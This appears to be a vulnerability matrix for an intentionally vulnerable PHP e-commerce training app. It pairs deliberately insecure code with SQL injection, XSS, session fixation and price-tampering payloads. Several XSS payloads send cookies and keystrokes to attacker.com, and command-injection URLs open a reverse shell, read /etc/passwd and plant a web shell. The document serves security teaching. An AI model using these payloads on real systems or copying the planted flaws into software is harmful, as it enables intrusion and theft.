# Vulnerability Matrix - TechNovation Solutions

## Executive Summary

This document provides a comprehensive analysis of all intentional vulnerabilities implemented in the TechNovation Solutions e-commerce platform. Each vulnerability is mapped to OWASP Top 10, includes CVSS scores, exploitation techniques, and detection methods.

## Vulnerability Overview Table

| ID | Vulnerability | OWASP | CVSS | Severity | Location | Status |
|----|---------------|-------|------|----------|----------|--------|
| V1 | SQL Injection | A03 | 9.8 | Critical | index.php, login.php | Active |
| V2 | Reflected XSS | A03 | 6.1 | Medium | index.php | Active |
| V3 | Stored XSS | A03 | 7.2 | High | product.php | Active |
| V4 | Broken Authentication | A07 | 9.1 | Critical | auth/* | Active |
| V5 | Sensitive Data Exposure | A02 | 7.5 | High | config/db.php | Active |
| V6 | IDOR | A01 | 6.5 | Medium | product.php, admin/* | Active |
| V7 | CSRF | A01 | 6.5 | Medium | Multiple forms | Active |
| V8 | Security Misconfiguration | A05 | 5.3 | Medium | Server-wide | Active |
| V9 | Command Injection | A03 | 9.8 | Critical | admin/dashboard.php | Active |
| V10 | Price Manipulation | A04 | 7.1 | High | cart/add_to_cart.php | Active |
| V11 | Session Fixation | A07 | 8.1 | High | auth/login.php | Active |
| V12 | Information Disclosure | A02 | 5.3 | Medium | Multiple | Active |
| V13 | API Security Issues | A01 | 7.5 | High | api/products.php | Active |
| V14 | Weak Password Policy | A07 | 5.3 | Medium | auth/register.php | Active |

---

## Detailed Vulnerability Descriptions

### V1: SQL Injection

**OWASP Category**: A03:2021 – Injection  
**CVSS 3.1 Score**: 9.8 (Critical)  
**CWE**: CWE-89

#### Description
Multiple SQL injection vulnerabilities exist throughout the application where user input is directly concatenated into SQL queries without proper sanitization or parameterization.

#### Affected Components
1. **index.php** - Search functionality
2. **auth/login.php** - User authentication
3. **admin/login.php** - Admin authentication
4. **product.php** - Product ID parameter
5. **api/products.php** - API endpoints

#### Vulnerable Code Examples

**index.php (Line 15-18):**
```php
if (isset($_GET['search'])) {
    $search = $_GET['search'];
    $query = "SELECT * FROM products WHERE name LIKE '%$search%'";
    $result = mysqli_query($conn, $query);
}
```

**auth/login.php (Line 12-14):**
```php
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

#### Exploitation Techniques

**1. Authentication Bypass:**
```sql
Username: admin' OR '1'='1
Password: anything

Resulting Query:
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
```

**2. Union-Based Injection:**
```sql
Search: ' UNION SELECT 1,username,password,4,5,6,7 FROM users--

Returns: All usernames and passwords from users table
```

**3. Time-Based Blind Injection:**
```sql
Search: ' AND SLEEP(5)--

Effect: Page loads after 5 second delay
```

**4. Data Extraction:**
```sql
Search: ' UNION SELECT NULL,table_name,NULL,NULL,NULL,NULL,NULL 
FROM information_schema.tables WHERE table_schema='technovation'--

Returns: All table names in database
```

#### Impact
- Complete database compromise
- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Potential server compromise

#### Detection Methods
- Manual testing with SQL payloads
- Automated scanners (SQLMap, Burp Suite)
- Error-based detection
- Time-based detection

#### Proof of Concept
```bash
# Using SQLMap
sqlmap -u "http://localhost/technovation_vulnerable_app/index.php?search=test" \
  --dbs --batch

# Manual testing
curl "http://localhost/technovation_vulnerable_app/index.php?search=' OR '1'='1"
```

---

### V2: Reflected Cross-Site Scripting (XSS)

**OWASP Category**: A03:2021 – Injection  
**CVSS 3.1 Score**: 6.1 (Medium)  
**CWE**: CWE-79

#### Description
User input from URL parameters is reflected in the HTML response without proper sanitization, allowing attackers to inject malicious JavaScript code.

#### Affected Components
- **index.php** - Search parameter display
- **product.php** - Various GET parameters

#### Vulnerable Code

**index.php (Line 67-69):**
```php
<?php if (isset($_GET['search'])): ?>
    <p class="search-result">Search results for: 
    <strong><?php echo $_GET['search']; ?></strong></p>
<?php endif; ?>
```

#### Exploitation Examples

**1. Basic XSS:**
```html
http://localhost/technovation_vulnerable_app/index.php?search=<script>alert('XSS')</script>
```

**2. Cookie Stealing:**
```html
http://localhost/technovation_vulnerable_app/index.php?search=<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie
</script>
```

**3. Keylogger:**
```html
http://localhost/technovation_vulnerable_app/index.php?search=<script>
document.onkeypress=function(e){
fetch('http://attacker.com/log?key='+e.key)}
</script>
```

**4. Phishing Form Injection:**
```html
?search=<div style="position:fixed;top:0;left:0;width:100%;height:100%;
background:white;z-index:9999;">
<form action="http://attacker.com/phish.php">
<input name="password" placeholder="Re-enter password">
<button>Submit</button></form></div>
```

#### Impact
- Session hijacking
- Credential theft
- Defacement
- Malware distribution
- Phishing attacks

---

### V3: Stored Cross-Site Scripting (XSS)

**OWASP Category**: A03:2021 – Injection  
**CVSS 3.1 Score**: 7.2 (High)  
**CWE**: CWE-79

#### Description
User-generated content (product reviews/comments) is stored in the database and displayed to other users without sanitization, allowing persistent XSS attacks.

#### Affected Components
- **product.php** - Comment system

#### Vulnerable Code

**product.php (Line 85-95):**
```php
if (isset($_POST['submit_comment'])) {
    $comment = $_POST['comment'];  // No sanitization
    mysqli_query($conn, "INSERT INTO comments (product_id, username, comment) 
                         VALUES ('$product_id', '$username', '$comment')");
}

// Display comments
while($comment = mysqli_fetch_assoc($comments_result)):
    echo $comment['comment'];  // No escaping
endwhile;
```

#### Exploitation Examples

**1. Persistent Cookie Stealer:**
```html
Comment: <script>
new Image().src='http://attacker.com/steal?c='+document.cookie;
</script>
```

**2. Admin Account Harvesting:**
```html
Comment: <script>
if(document.cookie.includes('admin')){
  fetch('http://attacker.com/admin?data='+btoa(document.cookie));
}
</script>
```

**3. Crypto Mining:**
```html
Comment: <script src="http://attacker.com/cryptominer.js"></script>
```

#### Impact
- Affects all users viewing the content
- Higher severity than reflected XSS
- Can target specific user groups
- Persistent until removed

---

### V4: Broken Authentication

**OWASP Category**: A07:2021 – Identification and Authentication Failures  
**CVSS 3.1 Score**: 9.1 (Critical)  
**CWE**: CWE-287, CWE-259

#### Description
Multiple authentication vulnerabilities including weak password policies, plain text password storage, and lack of account lockout mechanisms.

#### Sub-Vulnerabilities

**4a. Plain Text Password Storage**

**Location**: Database schema
```sql
CREATE TABLE users (
    password varchar(255) NOT NULL  -- Stored in plain text!
);

INSERT INTO users VALUES ('admin', 'admin123', 'admin');
```

**Impact**: Complete account compromise if database is breached

**4b. Weak Password Policy**

**Location**: auth/register.php
```php
elseif (strlen($password) < 4) {  // Only 4 characters required!
    $error = "Password must be at least 4 characters!";
}
```

**4c. No Account Lockout**

**Location**: auth/login.php, admin/login.php
- Unlimited login attempts allowed
- No rate limiting
- Vulnerable to brute force attacks

**4d. Session Fixation**

**Location**: auth/login.php
```php
if (isset($_GET['PHPSESSID'])) {
    session_id($_GET['PHPSESSID']);  // Accepts session ID from URL
}
```

#### Exploitation

**1. Brute Force Attack:**
```python
import requests

url = "http://localhost/technovation_vulnerable_app/auth/login.php"
usernames = ['admin', 'user', 'test']
passwords = ['admin', '12345', 'password', 'admin123']

for user in usernames:
    for pwd in passwords:
        response = requests.post(url, data={'username': user, 'password': pwd})
        if 'Welcome' in response.text:
            print(f"[+] Found: {user}:{pwd}")
```

**2. Session Fixation:**
```
1. Attacker gets session ID: abc123
2. Attacker sends link to victim: 
   http://site.com/login.php?PHPSESSID=abc123
3. Victim logs in
4. Attacker uses session ID abc123 to access victim's account
```

---

### V5: Sensitive Data Exposure

**OWASP Category**: A02:2021 – Cryptographic Failures  
**CVSS 3.1 Score**: 7.5 (High)  
**CWE**: CWE-200, CWE-312

#### Description
Sensitive information is exposed through various means including source code, error messages, and insecure storage.

#### Exposed Information

**1. Database Credentials**

**Location**: config/db.php
```php
define('DB_HOST', 'localhost');
define('DB_USER', 'root');
define('DB_PASS', '');  // Visible in source
define('DB_NAME', 'technovation');
```

**2. API Keys**

**Location**: assets/js/main.js
```javascript
const API_CONFIG = {
    apiKey: 'technovation_2026_key_12345'  // Exposed in client code
};
```

**3. Error Messages**

**Location**: config/db.php
```php
ini_set('display_errors', 1);
error_reporting(E_ALL);  // Displays detailed errors
```

**4. Debug Information**

**Location**: index.php
```php
<?php if (isset($_GET['debug'])): ?>
    <pre>
    Server Info: <?php echo $_SERVER['SERVER_SOFTWARE']; ?>
    PHP Version: <?php echo phpversion(); ?>
    Database: <?php echo DB_NAME; ?>
    </pre>
<?php endif; ?>
```

#### Exploitation
```
# Access debug information
http://localhost/technovation_vulnerable_app/index.php?debug=1

# Trigger error messages
http://localhost/technovation_vulnerable_app/product.php?id=999999

# View JavaScript for API keys
View Page Source > Search for "apiKey"
```

---

### V6: Insecure Direct Object References (IDOR)

**OWASP Category**: A01:2021 – Broken Access Control  
**CVSS 3.1 Score**: 6.5 (Medium)  
**CWE**: CWE-639

#### Description
Direct references to internal objects (products, orders, users) are exposed without proper authorization checks.

#### Vulnerable Endpoints

**1. Product Access**
```php
// product.php
$id = $_GET['id'];  // No validation
$query = "SELECT * FROM products WHERE id='$id'";
```

**2. Order Access**
```php
// admin/view_order.php
$id = $_GET['id'];  // No ownership check
$query = "SELECT * FROM orders WHERE id='$id'";
```

**3. Product Deletion**
```php
// admin/delete_product.php
$id = $_GET['id'];  // No CSRF token
mysqli_query($conn, "DELETE FROM products WHERE id='$id'");
```

#### Exploitation

**1. Access Other Users' Orders:**
```
# Normal access
http://localhost/technovation_vulnerable_app/admin/view_order.php?id=1

# IDOR - access order #2, #3, etc.
http://localhost/technovation_vulnerable_app/admin/view_order.php?id=2
```

**2. Enumerate All Products:**
```python
for i in range(1, 100):
    url = f"http://localhost/technovation_vulnerable_app/product.php?id={i}"
    response = requests.get(url)
    if "Product not found" not in response.text:
        print(f"[+] Product {i} exists")
```

---

### V9: Command Injection

**OWASP Category**: A03:2021 – Injection  
**CVSS 3.1 Score**: 9.8 (Critical)  
**CWE**: CWE-78

#### Description
User input is passed directly to system commands without validation, allowing arbitrary command execution.

#### Vulnerable Code

**Location**: admin/dashboard.php
```php
if (isset($_GET['backup'])) {
    $filename = $_GET['filename'];  // No sanitization
    $command = "mysqldump -u root technovation > backups/$filename.sql";
    system($command);  // Direct execution
}
```

#### Exploitation

**1. List Files:**
```
http://localhost/technovation_vulnerable_app/admin/dashboard.php?backup=1&filename=test;ls
```

**2. Read /etc/passwd:**
```
http://localhost/technovation_vulnerable_app/admin/dashboard.php?backup=1&filename=test;cat%20/etc/passwd
```

**3. Reverse Shell:**
```
http://localhost/technovation_vulnerable_app/admin/dashboard.php?backup=1&filename=test;nc%20-e%20/bin/bash%20attacker.com%204444
```

**4. Create Web Shell:**
```
http://localhost/technovation_vulnerable_app/admin/dashboard.php?backup=1&filename=test;echo%20%27<?php%20system($_GET[cmd]);%20?>%27%20>%20shell.php
```

#### Impact
- Complete server compromise
- Data exfiltration
- Malware installation
- Lateral movement
- Persistence establishment

---

### V10: Price Manipulation

**OWASP Category**: A04:2021 – Insecure Design  
**CVSS 3.1 Score**: 7.1 (High)  
**CWE**: CWE-471

#### Description
Product prices are sent from the client and trusted on the server without validation.

#### Vulnerable Code

**Location**: cart/add_to_cart.php
```php
$price = $_POST['price'];  // Trusted from client!
$quantity = $_POST['quantity'];
$total = $price * $quantity;  // Using manipulated price
```

**Location**: product.php
```html
<form action="cart/add_to_cart.php" method="POST">
    <input type="hidden" name="price" value="<?php echo $product['price']; ?>">
    <!-- Client can modify this value -->
</form>
```

#### Exploitation

**Method 1: Browser Developer Tools**
```
1. Right-click on page > Inspect Element
2. Find: <input type="hidden" name="price" value="3500.00">
3. Change to: <input type="hidden" name="price" value="0.01">
4. Submit form
```

**Method 2: Burp Suite**
```
1. Intercept POST request
2. Modify: price=3500.00 to price=0.01
3. Forward request
```

**Method 3: cURL**
```bash
curl -X POST http://localhost/technovation_vulnerable_app/cart/add_to_cart.php \
  -d "product_id=1&product=Laptop&price=0.01&quantity=1" \
  --cookie "PHPSESSID=abc123"
```

#### Impact
- Financial loss
- Inventory manipulation
- Business logic bypass

---

## Vulnerability Exploitation Workflow

### Phase 1: Reconnaissance
1. Identify technology stack
2. Map application structure
3. Enumerate endpoints
4. Gather credentials

### Phase 2: Vulnerability Discovery
1. Test for SQL injection
2. Check XSS vectors
3. Analyze authentication
4. Test access controls

### Phase 3: Exploitation
1. Exploit high-severity issues
2. Escalate privileges
3. Maintain access
4. Document findings

### Phase 4: Post-Exploitation
1. Extract sensitive data
2. Establish persistence
3. Cover tracks
4. Prepare report

## Testing Tools

### Recommended Tools
- **Burp Suite Professional**: Web application testing
- **OWASP ZAP**: Automated scanning
- **SQLMap**: SQL injection automation
- **Nikto**: Web server scanning
- **Nmap**: Port and service scanning
- **Metasploit**: Exploitation framework

### Tool Usage Examples

**SQLMap:**
```bash
sqlmap -u "http://localhost/technovation_vulnerable_app/index.php?search=test" \
  --dbs --batch
```

**OWASP ZAP:**
```bash
zap-cli quick-scan -s all http://localhost/technovation_vulnerable_app/
```

**Burp Suite:**
1. Configure browser proxy to 127.0.0.1:8080
2. Browse application
3. Use Scanner tab for automated testing
4. Use Repeater for manual testing

## Conclusion

This vulnerability matrix provides a comprehensive overview of all intentional security flaws in the TechNovation Solutions application. Each vulnerability is documented with:

- Technical description
- CVSS scoring
- Exploitation techniques  
- Real-world impact
- Detection methods

Use this document as a reference for your penetration testing assignment and security remediation efforts.

---

**Document Version**: 1.0  
**Last Updated**: January 2026  
**Classification**: Educational Use Only
